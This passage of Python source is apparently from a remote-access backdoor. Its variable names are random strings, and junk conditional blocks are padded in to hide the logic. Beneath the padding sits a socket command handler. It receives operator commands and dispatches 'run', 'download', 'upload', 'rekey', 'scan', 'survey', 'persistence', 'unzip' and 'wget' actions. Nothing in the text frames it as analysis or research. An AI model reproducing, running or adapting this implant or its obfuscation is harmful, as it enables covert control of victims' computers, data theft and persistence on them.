            UGCAfUTDUwfABLhcbXBppSiGmbBzQUlK = 'itYxuFYjkkQmaeFWcIhUHDcCdPGpRiGo'
            glxDxxWgPurpCnLTTjVWXQDDMflIRwab = 'WvPQCRGmwRHqIHavQxDHbQlGqxoGdGyx'
            ChseGwbgylqecDnRGsiWWEMLYfTydziN = 'RXltaPbwBAqIRDyhOpWeuUoWZJKpjYbc'
            aDrwFSRouYJiokrIPSInOPAiIXwlKnWj = 'BtAALHvisydXfDNFxETHZydyLALscjJk'
            BwpNbzcqJWHrtfgGckhbcplzknACatPk = 'PUSmSDTbDlcipuBaGqRUNcQJkvBuauhw'
            if QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx != ChseGwbgylqecDnRGsiWWEMLYfTydziN:
                UGCAfUTDUwfABLhcbXBppSiGmbBzQUlK = glxDxxWgPurpCnLTTjVWXQDDMflIRwab
                for BwpNbzcqJWHrtfgGckhbcplzknACatPk in ChseGwbgylqecDnRGsiWWEMLYfTydziN:
                    if BwpNbzcqJWHrtfgGckhbcplzknACatPk != glxDxxWgPurpCnLTTjVWXQDDMflIRwab:
                        UGCAfUTDUwfABLhcbXBppSiGmbBzQUlK = UGCAfUTDUwfABLhcbXBppSiGmbBzQUlK
                    else:
                        aDrwFSRouYJiokrIPSInOPAiIXwlKnWj = QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx
            else:
                glxDxxWgPurpCnLTTjVWXQDDMflIRwab = QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx
                QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx = aDrwFSRouYJiokrIPSInOPAiIXwlKnWj
                if glxDxxWgPurpCnLTTjVWXQDDMflIRwab == QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx:
                    for BwpNbzcqJWHrtfgGckhbcplzknACatPk in QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx:
                        if BwpNbzcqJWHrtfgGckhbcplzknACatPk == glxDxxWgPurpCnLTTjVWXQDDMflIRwab:
                            glxDxxWgPurpCnLTTjVWXQDDMflIRwab = QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx
                        else:
                            glxDxxWgPurpCnLTTjVWXQDDMflIRwab = aDrwFSRouYJiokrIPSInOPAiIXwlKnWj
        elif lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'run':
            wWpTTptVAykAyWtyOjFYahxwkEtsbREh = 'xIQkWiOsbmQxFwzmgLCZgonUxGopKsQe'
            phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ = 'OscWWjZYTelbSysuxISnINiLBvRpoUVQ'
            GxPhdBuXFrchZgbMAzCAvhbUPeyskpVC = 'dGnfivHaeDpndIRBxlUkMonSGdVxXWvz'
            sGtlUcmVPmrAGyWJnHIeVUVGkjelIzzf = 'oXJiJblobiaLAEMadMQYkFQMaAjdRdFk'
            WqKqfUrIgmCOaUupXqtChiRDGfOztjZQ = 'BkFYeUvnYYYNAaSLQqumSZRwoSCctVQX'
            if wWpTTptVAykAyWtyOjFYahxwkEtsbREh in phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ:
                wWpTTptVAykAyWtyOjFYahxwkEtsbREh = WqKqfUrIgmCOaUupXqtChiRDGfOztjZQ
                if phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ in GxPhdBuXFrchZgbMAzCAvhbUPeyskpVC:
                    phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ = sGtlUcmVPmrAGyWJnHIeVUVGkjelIzzf
            elif phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ in wWpTTptVAykAyWtyOjFYahxwkEtsbREh:
                GxPhdBuXFrchZgbMAzCAvhbUPeyskpVC = phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ
                if GxPhdBuXFrchZgbMAzCAvhbUPeyskpVC in phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ:
                    phzMVDKiVCDsAeyXBTMhOroRtxmNECeZ = WqKqfUrIgmCOaUupXqtChiRDGfOztjZQ
            bqhsUSHoxQrqBjrBDZiDlGiwTFOxPrNn = uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB.recv(4096)
            GvWrrsDNrmKRXzkQBfcnzwHyKBAUfdYL = 'PpHavRGlatAHzGYxMwDhvTvRkauVQVAu'
            hXNzAruwuMsYBMrFzoqtxMIAihYsGLHI = 'fFFLgiyygUiIrdpgBdevxZXAkbFOXSmi'
            if GvWrrsDNrmKRXzkQBfcnzwHyKBAUfdYL != hXNzAruwuMsYBMrFzoqtxMIAihYsGLHI:
                PQFlVzViVWPfatjsploRKHtWSAPNomnd = 'ZReUQsMIMpXOYlyxbZOesuOcJDSuBzIM'
                SVtMpawAxBffoRvienWQfMqzXyQqJsRS = 'eAAjqDFmjYlrPIQlUvHCDpOXFSgVKmgj'
                SVtMpawAxBffoRvienWQfMqzXyQqJsRS = PQFlVzViVWPfatjsploRKHtWSAPNomnd
            xVfSUAIOedODTUpopKvBeIbiGVBoHQmS = 'PeVillmteTxwcRBjaNftwgBAHjRlMRVQ'
            lSrySpsbrdYxzDWELTTbrFxUhWcgERnv = 'rAZImRQVowqREwkbUVHuJTosvkRefTCH'
            if xVfSUAIOedODTUpopKvBeIbiGVBoHQmS != lSrySpsbrdYxzDWELTTbrFxUhWcgERnv:
                cnRnOlSLtfYNUNeMUnfmoXQkcwkvJQQh = 'rAmBACeEjoTMJCqLOmaRWsZPHyzppcuA'
                vcbnFXcoGAxylBwkQtniJPOdkOCTIkpu = 'FOYTZKKRKWsMPcWUNYQMVJqsWIioqFtd'
                vcbnFXcoGAxylBwkQtniJPOdkOCTIkpu = cnRnOlSLtfYNUNeMUnfmoXQkcwkvJQQh
        elif lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'download':
            IkRHBUuQLmywmTGdiOwApmIYhoARZCbO = 'XJZExtdzRqcClUFWIlkIPKyTfXMZlMEL'
            tbXbwQjEJbasTniEHPqChDEmNKWuvROq = 'DgwtqKCqFAJLAHWWqGKYNnzaSaNKlsBp'
            NWlLXSWWJMLtfGKArNfObIQQmtPjdYdU = 'RhIYjBzWfqZYVEssCaggcxYQUnepODwU'
            EMrVWLmObXyVbuHUdWmLkflKosrwwgJF = 'rGUtYjbDlPCzWteyHfRlfpLLRWXjDHXy'
            osbQbLBVDIYhOxshKhOEOTAopzmPaAwT = 'UEogTosRdeFfneZfFDQCDWfdiyNXTjNX'
            if IkRHBUuQLmywmTGdiOwApmIYhoARZCbO in tbXbwQjEJbasTniEHPqChDEmNKWuvROq:
                IkRHBUuQLmywmTGdiOwApmIYhoARZCbO = osbQbLBVDIYhOxshKhOEOTAopzmPaAwT
                if tbXbwQjEJbasTniEHPqChDEmNKWuvROq in NWlLXSWWJMLtfGKArNfObIQQmtPjdYdU:
                    tbXbwQjEJbasTniEHPqChDEmNKWuvROq = EMrVWLmObXyVbuHUdWmLkflKosrwwgJF
            elif tbXbwQjEJbasTniEHPqChDEmNKWuvROq in IkRHBUuQLmywmTGdiOwApmIYhoARZCbO:
                NWlLXSWWJMLtfGKArNfObIQQmtPjdYdU = tbXbwQjEJbasTniEHPqChDEmNKWuvROq
                if NWlLXSWWJMLtfGKArNfObIQQmtPjdYdU in tbXbwQjEJbasTniEHPqChDEmNKWuvROq:
                    tbXbwQjEJbasTniEHPqChDEmNKWuvROq = osbQbLBVDIYhOxshKhOEOTAopzmPaAwT
            for JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq in action.split():
                OeemcDiJRuFiIaSHnYOXvbBjCLDpzlsl = 'OSWheVNAnoHgbZxIsEYnvBzqhfbWsKQN'
                kvTheOcRlKKKWslzLstTJvUuEBVWueHB = 'yjEtzRxbDbKhDAbKyHsJMUmfSJDkPBPz'
                gnmdmLHoxlAiThBPtuyWxkFnJooCpVQM = 'SklsyppdBVHfgYqAlTVWXjzcFtdmHKNt'
                if OeemcDiJRuFiIaSHnYOXvbBjCLDpzlsl == kvTheOcRlKKKWslzLstTJvUuEBVWueHB:
                    bbuWkBoGMpmyfqhGtLBCIhMOAOHveBUh = 'wILKtPgTWdKAlSkpWETfGFucOBIGOOoS'
                    bbuWkBoGMpmyfqhGtLBCIhMOAOHveBUh = OeemcDiJRuFiIaSHnYOXvbBjCLDpzlsl
                else:
                    bbuWkBoGMpmyfqhGtLBCIhMOAOHveBUh = 'wILKtPgTWdKAlSkpWETfGFucOBIGOOoS'
                    bbuWkBoGMpmyfqhGtLBCIhMOAOHveBUh = gnmdmLHoxlAiThBPtuyWxkFnJooCpVQM
                JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq = JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq.strip()
                OWpYpOpSPJpgHOwScrENXbxmAmIcFHCq(uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB, JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq, SCXvEteuykvAcchrxhrAjvYvMBGvaRtk)
        elif lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'upload':
            nEPnpknCgJpYYUhvBKMROFJPbSXSybJO = 'pPVTZxaNNgQWnZJCbaxetMvdZQIHjOFH'
            uGrMxJZdyFOYVGcQwKhjwvnrHmnceovG = 'GJjntHrxBuBelzIFXQHGHMvSAJlTSJqU'
            if nEPnpknCgJpYYUhvBKMROFJPbSXSybJO != uGrMxJZdyFOYVGcQwKhjwvnrHmnceovG:
                rdKouEiBDfEWOgfzrKjWzaLdDDFeIEvm = 'RzBdHnFBzRRaCtchZFfOkriWootALWCL'
                twOmOBTfxnturmFUyRLvwPqpCmbYWLHL = 'rJIYGtklcejKESHCVIKTjPEoaSoLcBEz'
                twOmOBTfxnturmFUyRLvwPqpCmbYWLHL = rdKouEiBDfEWOgfzrKjWzaLdDDFeIEvm
            for JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq in action.split():
                pQxBnQhKylrJVsBIABGYYaaSjINjMecA = 'PKRxzgBeyqPQBdnPnvyEwuNtRkOxGTJS'
                kpBktzNPhMWVFtLJhtVaGaaChGgsombb = 'dcxzJoOrcZVwdAPmLYUZqcrLbhkicyhB'
                BctYaONvEYgaTStkYpBnwOFYWifUSzgy = 'tkApiYIgfWUFyvStfBAHmPUsiUnBqxda'
                if pQxBnQhKylrJVsBIABGYYaaSjINjMecA == kpBktzNPhMWVFtLJhtVaGaaChGgsombb:
                    wfdMbqnTwMwqLuYrwNrdjuMJiOjpdJVQ = 'slzDapHDeZntIKkwyLZhSrNMnIItlbYC'
                    wfdMbqnTwMwqLuYrwNrdjuMJiOjpdJVQ = pQxBnQhKylrJVsBIABGYYaaSjINjMecA
                else:
                    wfdMbqnTwMwqLuYrwNrdjuMJiOjpdJVQ = 'slzDapHDeZntIKkwyLZhSrNMnIItlbYC'
                    wfdMbqnTwMwqLuYrwNrdjuMJiOjpdJVQ = BctYaONvEYgaTStkYpBnwOFYWifUSzgy
                JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq = JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq.strip()
                jpcIoIirVbyQvKBDBSJylGVgqeBgwYWB(uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB, JpJneYoLcVlbdMmeCofNRxOJuKxVLgyq, SCXvEteuykvAcchrxhrAjvYvMBGvaRtk)
        elif lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'rekey':
            khrSbgkozhGqAgXRzREYKbEghwppncwH = 'LKPpIqudxJxPVjhGLdIBARIgEIEGenqn'
            GibncfSqrlBRhnyLJpBIavURMXCGegwd = 'WrCmFZgiyEUlEdEUcQGwtvteNwaxSXka'
            xvUZSkiBfjIPiXUZLqmzYKcXXWvySIUx = 'HAFCpYkqiTKsYSSXWiadIEjMbcqEKqye'
            xRjvRSRIGSEblffqbWxlGTLACiJTffMn = 'wpVzCchfTQRsqpKvIinqeEEQySwwrBSo'
            NExEADlBVajeLyMJYmDvWnqhcdwItyLx = 'fSdCFagyWfrVwZzIXpAvHeZSmsOoHjMH'
            if khrSbgkozhGqAgXRzREYKbEghwppncwH in GibncfSqrlBRhnyLJpBIavURMXCGegwd:
                khrSbgkozhGqAgXRzREYKbEghwppncwH = NExEADlBVajeLyMJYmDvWnqhcdwItyLx
                if GibncfSqrlBRhnyLJpBIavURMXCGegwd in xvUZSkiBfjIPiXUZLqmzYKcXXWvySIUx:
                    GibncfSqrlBRhnyLJpBIavURMXCGegwd = xRjvRSRIGSEblffqbWxlGTLACiJTffMn
            elif GibncfSqrlBRhnyLJpBIavURMXCGegwd in khrSbgkozhGqAgXRzREYKbEghwppncwH:
                xvUZSkiBfjIPiXUZLqmzYKcXXWvySIUx = GibncfSqrlBRhnyLJpBIavURMXCGegwd
                if xvUZSkiBfjIPiXUZLqmzYKcXXWvySIUx in GibncfSqrlBRhnyLJpBIavURMXCGegwd:
                    GibncfSqrlBRhnyLJpBIavURMXCGegwd = NExEADlBVajeLyMJYmDvWnqhcdwItyLx
            SCXvEteuykvAcchrxhrAjvYvMBGvaRtk = ejviyCNkcSZJfLMoBkJdCaGLsZpnMUmN(uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB, VDmlsrDtexgyuVPCdUUHUFLHIfLGCbOF=True)
            CjQlItifyvYhpxSiJLqyFIIPtEIkKmBf = 'LygasdIQuNhXYiaIQCRjcOoAhcsqDzNE'
            LDRjnHsrdnDIPHEOmMgIyoHgBgijHQRO = 'gsjYtYFNcPnaiDwKneCZlkenKvOTAPCD'
            if CjQlItifyvYhpxSiJLqyFIIPtEIkKmBf != LDRjnHsrdnDIPHEOmMgIyoHgBgijHQRO:
                jGonQvOtLpqtFgJUaJsmMvQbAtoWwEQf = 'xYnozQphBakAyvhnIATClvbrcgwwzUex'
                cllEhSVdCBJXqkabHcjuSYtzXkDkgURY = 'KmZVkLfzHpaFocNkKaGSUVXzsRvTmLar'
                cllEhSVdCBJXqkabHcjuSYtzXkDkgURY = jGonQvOtLpqtFgJUaJsmMvQbAtoWwEQf
        elif lhiXsFxHuOAPadUCYJONTiuilGUagYDM in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            aSOdeiAATMtfSysTEshCNtPhekabyaJn = 'dFGliLGcbWSCepqbcrZJpGCUyTpfefZR'
            mtSZUyAOdUxaokvFiEHhkpshDDzGFSYv = 'OKABUXpHoRewTpqeCwMfomyXQsuFfHoS'
            bfeSjrDMalzTVrrueFuBWTrZOzCiBdRI = 'LVCkimuUVFdUunmeFQtJxZyiSiCeoEZc'
            jWDnzDwVcIaDnciYGONNPuZvBSqzVUVl = 'YAetjvTGOobaCvAJaBaOVmKXXJcIpIKH'
            KDgzLTccPIgdHNYBLPZSauVpLRxOjCIc = 'WpKVOPbTxzIRvrKfXawkVidXBGcDWRhe'
            zPixxSGFQWkBrCgMDpAZwQZrAeraZwBu = 'TmUVHjQttTYKoJWUtKyJaYwGsUFkpwLl'
            if bfeSjrDMalzTVrrueFuBWTrZOzCiBdRI == jWDnzDwVcIaDnciYGONNPuZvBSqzVUVl:
                for zPixxSGFQWkBrCgMDpAZwQZrAeraZwBu in KDgzLTccPIgdHNYBLPZSauVpLRxOjCIc:
                    if zPixxSGFQWkBrCgMDpAZwQZrAeraZwBu == jWDnzDwVcIaDnciYGONNPuZvBSqzVUVl:
                        KDgzLTccPIgdHNYBLPZSauVpLRxOjCIc = aSOdeiAATMtfSysTEshCNtPhekabyaJn
                    else:
                        jWDnzDwVcIaDnciYGONNPuZvBSqzVUVl = mtSZUyAOdUxaokvFiEHhkpshDDzGFSYv
            zbEUEYPHLKsHKcVuhRKMqQcAvETYvjwW = 'tMCDzFSQvsVNGbNRwIgmfqUCjSpAFAQG'
            spADNKQYBjSghrnaOJPxwWYkZMRsJlax = 'aVKIhBmjttNolzRpfQnDBGoiQsSVWobN'
            fwyXGDcGmGAxZGwiGMsByvvTsIAwQNXY = 'LxGouEZOuBNFmEPtPtGyRupynRdivFND'
            OAPNdvTHNpPmvQtKPFKOZulwtjmanuze = 'dPpePcBVnfYqnoyLmaVjWPjQZdDJYUXI'
            hbIHzNRJsHuEujGkccBSKWRjluKwnofH = 'HaizGbqQkwJquohpSzCoFQtvCtUmderA'
            iLwLiAMGxKVlQwWfUiaxqKcpJojzgPaa = 'DSVXaKxvtIDuxunsRXpxqlOqyAmenLev'
            if fwyXGDcGmGAxZGwiGMsByvvTsIAwQNXY == OAPNdvTHNpPmvQtKPFKOZulwtjmanuze:
                for iLwLiAMGxKVlQwWfUiaxqKcpJojzgPaa in hbIHzNRJsHuEujGkccBSKWRjluKwnofH:
                    if iLwLiAMGxKVlQwWfUiaxqKcpJojzgPaa == OAPNdvTHNpPmvQtKPFKOZulwtjmanuze:
                        hbIHzNRJsHuEujGkccBSKWRjluKwnofH = zbEUEYPHLKsHKcVuhRKMqQcAvETYvjwW
                    else:
                        OAPNdvTHNpPmvQtKPFKOZulwtjmanuze = spADNKQYBjSghrnaOJPxwWYkZMRsJlax
            bqhsUSHoxQrqBjrBDZiDlGiwTFOxPrNn = uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB.recv(1024)
            mQAVrapwRToqGsMGssvVerTkeQTCkAWu = 'EZZYLERlRyUxkIYtRDWGKKqfNoCBINqL'
            ZFHyXsTxyMpdOkUkrVBSQyAwBziRuNal = 'rStmNcdYYNEbODAiVBEHNbofJzeoCUDb'
            DhVPhjVLVshJLtImAVlNDuGLPafrxpzR = 'QQRqqMTSlMWVselFUkaIcPIhVVBlqjlr'
            VAlaiPjpyPlfPDIzJEsdpCClnjaTtLdt = 'GJAhHqOVXaUHMHbBjXepXzHhkZjhcaLm'
            XvAjxazJCSKrhNXeBZcEZrBxCuMHOusf = 'QjUCKLYCAsakSqmBGnBETvjTeSMoNyGP'
            FvOUmmRlsiaImgIMkyrGQmxbgbyPiZZd = 'iBgAXJwtvTWxzoplTcSgOGvwENDlehKr'
            if DhVPhjVLVshJLtImAVlNDuGLPafrxpzR == VAlaiPjpyPlfPDIzJEsdpCClnjaTtLdt:
                for FvOUmmRlsiaImgIMkyrGQmxbgbyPiZZd in XvAjxazJCSKrhNXeBZcEZrBxCuMHOusf:
                    if FvOUmmRlsiaImgIMkyrGQmxbgbyPiZZd == VAlaiPjpyPlfPDIzJEsdpCClnjaTtLdt:
                        XvAjxazJCSKrhNXeBZcEZrBxCuMHOusf = mQAVrapwRToqGsMGssvVerTkeQTCkAWu
                    else:
                        VAlaiPjpyPlfPDIzJEsdpCClnjaTtLdt = ZFHyXsTxyMpdOkUkrVBSQyAwBziRuNal
            NjDKzaGVmyAmEDsydxmkTLNLuluQbkps = 'fttiRWzHxtbSIGuDIGMzspFiLZrFORHu'
            XztwWOjePHTclfNbZcULphvAVUCQczJC = 'WjNOZnavGcotgvGNRcUTwamYOtZtigHd'
            if NjDKzaGVmyAmEDsydxmkTLNLuluQbkps != XztwWOjePHTclfNbZcULphvAVUCQczJC:
                hByKqtItRpJGJthlBTfyTmnCphgGfeQR = 'JfPSFgjotrtOsIqDKDAZLRgLyDxMBrDn'
                UcHMSUrkiMqrqzaoHsfMCzymWZQUimAl = 'OPqrRJftRaDmHQwlDrbMrVZOFaBjVhLs'
                UcHMSUrkiMqrqzaoHsfMCzymWZQUimAl = hByKqtItRpJGJthlBTfyTmnCphgGfeQR
if __name__ == '__main__':
    UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY = 'XOUeRkegWvUouwZgApPWBFfNveYZAZmT'
    WBuYpmmrlgzeHFNgPigYYjDMYGicLBqS = 'WzhUdaZxyAPyNfJcnOUsjxReCcmCaFkU'
    tvDayzzpUpNtqincVitsdernyXnJaGIr = 'DXvexyxRYmvIjydjEdwFyhjzEtilhBZx'
    VCWWnaDRPEKQYOxoFtaTtaPiWNJXverH = 'MSmeGSzyuIVtlKAvfpNJndiQRvpEvtSz'
    pYmKtwQgAKKHOeQctKNfqpaGOnTLnkEL = 'twxMrpKgXCCnYUvIvMtwAVwKmCOdQbns'
    IqZKwnzdDmDgEJGzHVCKLKBowaQxjdjq = 'bjfwNmwxHMHClQGMOGXuHYwSmEvPuytQ'
    if UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY != VCWWnaDRPEKQYOxoFtaTtaPiWNJXverH:
        WBuYpmmrlgzeHFNgPigYYjDMYGicLBqS = tvDayzzpUpNtqincVitsdernyXnJaGIr
        for IqZKwnzdDmDgEJGzHVCKLKBowaQxjdjq in VCWWnaDRPEKQYOxoFtaTtaPiWNJXverH:
            if IqZKwnzdDmDgEJGzHVCKLKBowaQxjdjq != tvDayzzpUpNtqincVitsdernyXnJaGIr:
                WBuYpmmrlgzeHFNgPigYYjDMYGicLBqS = WBuYpmmrlgzeHFNgPigYYjDMYGicLBqS
            else:
                pYmKtwQgAKKHOeQctKNfqpaGOnTLnkEL = UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY
    else:
        tvDayzzpUpNtqincVitsdernyXnJaGIr = UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY
        UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY = pYmKtwQgAKKHOeQctKNfqpaGOnTLnkEL
        if tvDayzzpUpNtqincVitsdernyXnJaGIr == UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY:
            for IqZKwnzdDmDgEJGzHVCKLKBowaQxjdjq in UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY:
                if IqZKwnzdDmDgEJGzHVCKLKBowaQxjdjq == tvDayzzpUpNtqincVitsdernyXnJaGIr:
                    tvDayzzpUpNtqincVitsdernyXnJaGIr = UBJgWgmOQRnMETcmnxObwFEKzHlrOKQY
                else:
                    tvDayzzpUpNtqincVitsdernyXnJaGIr = pYmKtwQgAKKHOeQctKNfqpaGOnTLnkEL
    peLcLHBhgzuWqIXCIFmkLiUOYdArvOei()
    pFLkDoVfmPTwVVicLhxGRDtYEOskcjsi = 'LqvfSTJwTbUqlwBfWVGAPahJsMMDBgEX'
    vgPUfdEVJobaOjWsyAPhAUAvLaCLVMuc = 'npYystBtJjgYWXZPLvsjJFzGkULLrAMC'
    if pFLkDoVfmPTwVVicLhxGRDtYEOskcjsi != vgPUfdEVJobaOjWsyAPhAUAvLaCLVMuc:
        YnRUfVmfjcbggyOXxwjbCocihJRjhHRr = 'ltasxbslTQXUkicEZRsMYEERUktqHPtH'
        tNbdwZsJmvRjlKQyZIFRsrXGgRurpFFL = 'uynOExHuQppQWZxHHlwuUlnchWyrpCjz'
        tNbdwZsJmvRjlKQyZIFRsrXGgRurpFFL = YnRUfVmfjcbggyOXxwjbCocihJRjhHRr
